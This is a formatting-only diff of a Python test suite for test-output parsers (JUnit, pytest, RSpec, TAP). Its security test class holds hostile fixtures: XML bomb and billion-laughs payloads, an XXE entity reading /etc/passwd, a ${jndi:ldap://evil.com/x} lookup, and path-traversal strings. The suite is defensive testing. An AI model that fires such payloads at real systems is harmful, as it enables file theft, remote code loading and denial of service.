@@ -88,11 +88,9 @@ ERROR test_auth.py::test_login - NameError: name 'AuthService' is not defined
 
     def test_extract_assertion_values(self):
         # Test the base parser method
-        expected, actual = self.parser._extract_assertion_values(
-            "assert False == True"
-        )
+        expected, actual = self.parser._extract_assertion_values("assert False == True")
         self.assertEqual(expected, "True")  # What we expected to be true
-        self.assertEqual(actual, "False")   # What we actually got
+        self.assertEqual(actual, "False")  # What we actually got
 
 
 class TestRSpecParser(unittest.TestCase):
@@ -203,9 +201,8 @@ class TestTokenBudget(unittest.TestCase):
         truncated = budget.smart_truncate(long_text, max_tokens=10)
 
         self.assertLess(len(truncated), len(long_text))
-        self.assertTrue(
-            truncated.endswith("...") or len(truncated) < len(long_text)
-        )
+        self.assertTrue(truncated.endswith("...") or len(truncated) < len(long_text))
+
 
 class TestEdgeCases(unittest.TestCase):
     """Test edge cases and error conditions."""
@@ -234,12 +231,12 @@ class TestEdgeCases(unittest.TestCase):
         """Test parsers handle Unicode content."""
         parser = JUnitParser()
 
-        unicode_xml = '''<?xml version="1.0" encoding="UTF-8"?>
+        unicode_xml = """<?xml version="1.0" encoding="UTF-8"?>
 <testsuite name="UnicodeTest" tests="1" failures="1">
   <testcase name="test_unicode" classname="TestClass">
     <failure message="Unicode test: 你好世界 🚀 ñáñá">Unicode failure: émojis 🎉</failure>
   </testcase>
-</testsuite>'''
+</testsuite>"""
 
         result = parser.parse(unicode_xml)
         self.assertEqual(result.total_tests, 1)
@@ -258,11 +255,11 @@ class TestEdgeCases(unittest.TestCase):
 
     def test_path_normalization_edge_cases(self):
         """Test path normalization with various edge cases."""
-        sys.path.insert(0, str(Path(__file__).parent.parent / 'src'))
+        sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
         from tpane.core.encoder import TOPAEncoder
         from tpane.core.token_budget import TokenBudget
 
-        encoder = TOPAEncoder('failures', TokenBudget(1000))
+        encoder = TOPAEncoder("failures", TokenBudget(1000))
 
         # Test various path formats
         test_paths = [
@@ -282,7 +279,7 @@ class TestEdgeCases(unittest.TestCase):
 
     def test_token_budget_edge_cases(self):
         """Test token budget with edge cases."""
-        sys.path.insert(0, str(Path(__file__).parent.parent / 'src'))
+        sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
         from tpane.core.token_budget import TokenBudget
 
         # Zero budget
@@ -309,7 +306,7 @@ class TestSecurityEdgeCases(unittest.TestCase):
         parser = JUnitParser()
 
         # Create a potential XML bomb pattern (many nested entities)
-        xml_bomb = '''<?xml version="1.0"?>
+        xml_bomb = """<?xml version="1.0"?>
 <!DOCTYPE root [
 <!ENTITY a "aaaaaaaaaa">
 <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
@@ -319,7 +316,7 @@ class TestSecurityEdgeCases(unittest.TestCase):
   <testcase name="test_bomb" classname="TestClass">
     <failure message="&c;">&c;</failure>
   </testcase>
-</testsuite>'''
+</testsuite>"""
 
         # Should handle gracefully without consuming excessive resources
         # defusedxml should prevent entity processing, causing fallback to text parsing
@@ -333,7 +330,7 @@ class TestSecurityEdgeCases(unittest.TestCase):
         parser = JUnitParser()
 
         # Attempt XXE injection
-        xxe_xml = '''<?xml version="1.0" encoding="UTF-8"?>
+        xxe_xml = """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE testsuite [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
@@ -341,7 +338,7 @@ class TestSecurityEdgeCases(unittest.TestCase):
   <testcase name="test_xxe" classname="TestClass">
     <failure message="&xxe;">XXE test</failure>
   </testcase>
-</testsuite>'''
+</testsuite>"""
 
         # Should handle without executing external entity
         # defusedxml should prevent XXE processing, causing fallback to text parsing
@@ -357,7 +354,7 @@ class TestSecurityEdgeCases(unittest.TestCase):
         parser = JUnitParser()
 
         # Billion laughs pattern
-        billion_laughs = '''<?xml version="1.0"?>
+        billion_laughs = """<?xml version="1.0"?>
 <!DOCTYPE root [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
@@ -368,11 +365,12 @@ class TestSecurityEdgeCases(unittest.TestCase):
   <testcase name="test_billion_laughs">
     <failure>&lol4;</failure>
   </testcase>
-</testsuite>'''
+</testsuite>"""
 
         # Should complete within reasonable time/memory
         # defusedxml should prevent entity expansion, causing fallback to text parsing
         import time
+
         start_time = time.time()
 
         result = parser.parse(billion_laughs)
@@ -386,7 +384,7 @@ class TestSecurityEdgeCases(unittest.TestCase):
         """Test handling of malicious CDATA sections."""
         parser = JUnitParser()
 
-        malicious_cdata = '''<?xml version="1.0"?>
+        malicious_cdata = """<?xml version="1.0"?>
 <testsuite name="CDATATest" tests="1">
   <testcase name="test_cdata">
     <failure><![CDATA[
@@ -395,7 +393,7 @@ class TestSecurityEdgeCases(unittest.TestCase):
       ${jndi:ldap://evil.com/x}
     ]]></failure>
   </testcase>
-</testsuite>'''
+</testsuite>"""
 
         result = parser.parse(malicious_cdata)
         self.assertEqual(result.total_tests, 1)
@@ -404,19 +402,31 @@ class TestSecurityEdgeCases(unittest.TestCase):
 
     def test_path_normalization_security_display(self):
         """Test path normalization handles potentially malicious paths safely for display."""
-        sys.path.insert(0, str(Path(__file__).parent.parent / 'src'))
+        sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
         from tpane.core.encoder import TOPAEncoder
         from tpane.core.token_budget import TokenBudget
 
-        encoder = TOPAEncoder('failures', TokenBudget(1000))
+        encoder = TOPAEncoder("failures", TokenBudget(1000))
 
         # Test various edge case paths (these are for display, not file access)
         test_paths = [
-            ("../../../etc/passwd", "passwd"),  # Malicious path should be sanitized to filename only
-            ("..\\..\\..\\windows\\system32\\config\\sam", "sam"),  # Malicious path should be sanitized to filename only
-            ("/etc/passwd", "passwd"),  # Absolute system path should be sanitized to filename only
+            (
+                "../../../etc/passwd",
+                "passwd",
+            ),  # Malicious path should be sanitized to filename only
+            (
+                "..\\..\\..\\windows\\system32\\config\\sam",
+                "sam",
+            ),  # Malicious path should be sanitized to filename only
+            (
+                "/etc/passwd",
+                "passwd",
+            ),  # Absolute system path should be sanitized to filename only
             ("normal_file.rb", "normal_file.rb"),  # Normal files unchanged
-            ("spec/user_spec.rb", "spec/user_spec.rb"),  # Normal relative paths preserved
+            (
+                "spec/user_spec.rb",
+                "spec/user_spec.rb",
+            ),  # Normal relative paths preserved
             ("", "unknown"),  # Empty path
         ]
 
@@ -429,9 +439,9 @@ class TestSecurityEdgeCases(unittest.TestCase):
                 # For specific known cases, check expected patterns
                 if expected_pattern:
                     self.assertTrue(
-                        expected_pattern in normalized or
-                        normalized.endswith(expected_pattern.split('/')[-1]),
-                        f"Expected pattern '{expected_pattern}' not found in '{normalized}'"
+                        expected_pattern in normalized
+                        or normalized.endswith(expected_pattern.split("/")[-1]),
+                        f"Expected pattern '{expected_pattern}' not found in '{normalized}'",
                     )
 
 
@@ -444,7 +454,7 @@ class TestResourceConstraints(unittest.TestCase):
 
         # XML with very large test count attribute
         large_count_xml = f'''<?xml version="1.0"?>
-<testsuite name="LargeCountTest" tests="{2**31-1}" failures="0">
+<testsuite name="LargeCountTest" tests="{2**31 - 1}" failures="0">
   <testcase name="test_one" classname="TestClass"/>
 </testsuite>'''
 
@@ -463,14 +473,14 @@ class TestResourceConstraints(unittest.TestCase):
 
         # Build nested structure
         for i in range(nested_depth):
-            nested_xml += f'<level{i}>\n'
+            nested_xml += f"<level{i}>\n"
 
-        nested_xml += '''<testsuite name="NestedTest" tests="1">
+        nested_xml += """<testsuite name="NestedTest" tests="1">
   <testcase name="test_nested" classname="TestClass"/>
-</testsuite>\n'''
+</testsuite>\n"""
 
-        for i in range(nested_depth-1, -1, -1):
-            nested_xml += f'</level{i}>\n'
+        for i in range(nested_depth - 1, -1, -1):
+            nested_xml += f"</level{i}>\n"
 
         # Should handle without stack overflow
         result = parser.parse(nested_xml)
@@ -484,16 +494,19 @@ class TestResourceConstraints(unittest.TestCase):
         testcase_count = 10000
         xml_parts = [
             '<?xml version="1.0"?>',
-            f'<testsuite name="ManyTestsuite" tests="{testcase_count}" failures="0">'
+            f'<testsuite name="ManyTestsuite" tests="{testcase_count}" failures="0">',
         ]
 
         for i in range(testcase_count):
-            xml_parts.append(f'  <testcase name="test_{i}" classname="TestClass{i % 100}"/>')
+            xml_parts.append(
+                f'  <testcase name="test_{i}" classname="TestClass{i % 100}"/>'
+            )
 
-        xml_parts.append('</testsuite>')
-        many_tests_xml = '\n'.join(xml_parts)
+        xml_parts.append("</testsuite>")
+        many_tests_xml = "\n".join(xml_parts)
 
         import time
+
         start_time = time.time()
 
         result = parser.parse(many_tests_xml)
@@ -526,16 +539,16 @@ class TestResourceConstraints(unittest.TestCase):
         parser = JUnitParser()
 
         # Parse multiple large files to test memory management
-        large_xml = '''<?xml version="1.0"?>
-<testsuite name="MemoryTest" tests="1000" failures="1000">'''
+        large_xml = """<?xml version="1.0"?>
+<testsuite name="MemoryTest" tests="1000" failures="1000">"""
 
         for i in range(1000):
-            large_xml += f'''
+            large_xml += f"""
   <testcase name="test_{i}" classname="TestClass">
     <failure message="Failure message {i}">Stack trace for test {i}</failure>
-  </testcase>'''
+  </testcase>"""
 
-        large_xml += '\n</testsuite>'
+        large_xml += "\n</testsuite>"
 
         # Parse the same content multiple times
         for _iteration in range(5):
@@ -553,7 +566,7 @@ class TestConcurrentAndThreadingSafety(unittest.TestCase):
         import time
 
         # Create test data
-        test_xml = '''<?xml version="1.0"?>
+        test_xml = """<?xml version="1.0"?>
 <testsuite name="ConcurrentTest" tests="10" failures="2">
   <testcase name="test_1" classname="TestClass"/>
   <testcase name="test_2" classname="TestClass">
@@ -569,7 +582,7 @@ class TestConcurrentAndThreadingSafety(unittest.TestCase):
   <testcase name="test_8" classname="TestClass"/>
   <testcase name="test_9" classname="TestClass"/>
   <testcase name="test_10" classname="TestClass"/>
-</testsuite>'''
+</testsuite>"""
 
         results = []
         errors = []
@@ -580,8 +593,17 @@ class TestConcurrentAndThreadingSafety(unittest.TestCase):
                 parser = JUnitParser()
                 for i in range(5):  # Parse multiple times per thread
                     result = parser.parse(test_xml)
-                    results.append((thread_id, i, result.total_tests, result.failed_tests))
-                    time.sleep(0.001)  # Small delay to increase chance of race conditions
+                    results.append(
+                        (
+                            thread_id,
+                            i,
+                            result.total_tests,
+                            result.failed_tests,
+                        )
+                    )
+                    time.sleep(
+                        0.001
+                    )  # Small delay to increase chance of race conditions
             except Exception as e:
                 errors.append((thread_id, str(e)))
 
@@ -602,8 +624,16 @@ class TestConcurrentAndThreadingSafety(unittest.TestCase):
 
         # All results should be consistent
         for thread_id, iteration, total, failed in results:
-            self.assertEqual(total, 10, f"Thread {thread_id}, iteration {iteration}: expected 10 tests")
-            self.assertEqual(failed, 2, f"Thread {thread_id}, iteration {iteration}: expected 2 failures")
+            self.assertEqual(
+                total,
+                10,
+                f"Thread {thread_id}, iteration {iteration}: expected 10 tests",
+            )
+            self.assertEqual(
+                failed,
+                2,
+                f"Thread {thread_id}, iteration {iteration}: expected 2 failures",
+            )
 
     def test_thread_safety_with_different_inputs(self):
         """Test parsers handle different inputs concurrently."""
@@ -611,22 +641,34 @@ class TestConcurrentAndThreadingSafety(unittest.TestCase):
 
         # Different test inputs
         test_inputs = [
-            ('junit', '''<?xml version="1.0"?>
+            (
+                "junit",
+                """<?xml version="1.0"?>
 <testsuite name="JUnitTest" tests="3" failures="1">
   <testcase name="test_1"/><testcase name="test_2"><failure>fail</failure></testcase><testcase name="test_3"/>
-</testsuite>'''),
-            ('pytest', '''=== FAILURES ===
+</testsuite>""",
+            ),
+            (
+                "pytest",
+                """=== FAILURES ===
 test_example.py::test_function FAILED
 test_example.py::test_another PASSED
-=== 1 failed, 1 passed in 0.02s ==='''),
-            ('rspec', '''Finished in 0.12 seconds
+=== 1 failed, 1 passed in 0.02s ===""",
+            ),
+            (
+                "rspec",
+                """Finished in 0.12 seconds
 3 examples, 1 failure
-test_spec.rb:10 failure message'''),
-            ('tap', '''1..3
+test_spec.rb:10 failure message""",
+            ),
+            (
+                "tap",
+                """1..3
 ok 1 - test passes
 not ok 2 - test fails
-ok 3 - another test'''),
-            ('empty', ''),
+ok 3 - another test""",
+            ),
+            ("empty", ""),
         ]
 
         results = {}
@@ -646,11 +688,13 @@ ok 3 - another test'''),
                 thread_results = []
                 for parser in parsers:
                     result = parser.parse(content)
-                    thread_results.append({
-                        'parser': parser.__class__.__name__,
-                        'total_tests': result.total_tests,
-                        'failed_tests': result.failed_tests
-                    })
+                    thread_results.append(
+                        {
+                            "parser": parser.__class__.__name__,
+                            "total_tests": result.total_tests,
+                            "failed_tests": result.failed_tests,
+                        }
+                    )
 
                 results[input_type] = thread_results
             except Exception as e:
@@ -672,11 +716,13 @@ ok 3 - another test'''),
         self.assertEqual(len(results), 5, f"Expected 5 result sets, got {len(results)}")
 
         # Verify some expected patterns
-        if 'junit' in results:
-            junit_results = results['junit']
-            junit_parser_result = next((r for r in junit_results if r['parser'] == 'JUnitParser'), None)
+        if "junit" in results:
+            junit_results = results["junit"]
+            junit_parser_result = next(
+                (r for r in junit_results if r["parser"] == "JUnitParser"), None
+            )
             if junit_parser_result:
-                self.assertGreater(junit_parser_result['total_tests'], 0)
+                self.assertGreater(junit_parser_result["total_tests"], 0)
 
     def test_large_input_stability(self):
         """Test parser stability with large inputs over time."""
@@ -685,16 +731,23 @@ ok 3 - another test'''),
         parser = JUnitParser()
 
         # Generate large but reasonable test data
-        large_xml_parts = ['<?xml version="1.0"?>', '<testsuite name="StabilityTest" tests="500" failures="100">']
+        large_xml_parts = [
+            '<?xml version="1.0"?>',
+            '<testsuite name="StabilityTest" tests="500" failures="100">',
+        ]
 
         for i in range(500):
             if i % 5 == 0:  # Every 5th test fails
-                large_xml_parts.append(f'<testcase name="test_{i}" classname="TestClass{i % 10}"><failure message="Failure {i}">Stack trace {i}</failure></testcase>')
+                large_xml_parts.append(
+                    f'<testcase name="test_{i}" classname="TestClass{i % 10}"><failure message="Failure {i}">Stack trace {i}</failure></testcase>'
+                )
             else:
-                large_xml_parts.append(f'<testcase name="test_{i}" classname="TestClass{i % 10}"/>')
+                large_xml_parts.append(
+                    f'<testcase name="test_{i}" classname="TestClass{i % 10}"/>'
+                )
 
-        large_xml_parts.append('</testsuite>')
-        large_xml = '\n'.join(large_xml_parts)
+        large_xml_parts.append("</testsuite>")
+        large_xml = "\n".join(large_xml_parts)
 
         # Parse multiple times and verify consistency
         results = []
@@ -703,28 +756,39 @@ ok 3 - another test'''),
             result = parser.parse(large_xml)
             end_time = time.time()
 
-            results.append({
-                'iteration': i,
-                'total_tests': result.total_tests,
-                'failed_tests': result.failed_tests,
-                'parse_time': end_time - start_time,
-            })
+            results.append(
+                {
+                    "iteration": i,
+                    "total_tests": result.total_tests,
+                    "failed_tests": result.failed_tests,
+                    "parse_time": end_time - start_time,
+                }
+            )
 
         # Verify consistency across iterations
         first_result = results[0]
         for result in results[1:]:
-            self.assertEqual(result['total_tests'], first_result['total_tests'],
-                           f"Test count inconsistent at iteration {result['iteration']}")
-            self.assertEqual(result['failed_tests'], first_result['failed_tests'],
-                           f"Failure count inconsistent at iteration {result['iteration']}")
+            self.assertEqual(
+                result["total_tests"],
+                first_result["total_tests"],
+                f"Test count inconsistent at iteration {result['iteration']}",
+            )
+            self.assertEqual(
+                result["failed_tests"],
+                first_result["failed_tests"],
+                f"Failure count inconsistent at iteration {result['iteration']}",
+            )
 
         # Verify performance doesn't degrade significantly
-        avg_time = sum(r['parse_time'] for r in results) / len(results)
-        max_time = max(r['parse_time'] for r in results)
+        avg_time = sum(r["parse_time"] for r in results) / len(results)
+        max_time = max(r["parse_time"] for r in results)
 
         # Max time shouldn't be more than 3x average (allows for some variation)
-        self.assertLess(max_time, avg_time * 3.0,
-                       f"Performance degradation detected: max {max_time:.3f}s vs avg {avg_time:.3f}s")
+        self.assertLess(
+            max_time,
+            avg_time * 3.0,
+            f"Performance degradation detected: max {max_time:.3f}s vs avg {avg_time:.3f}s",
+        )
 
 
 if __name__ == "__main__":
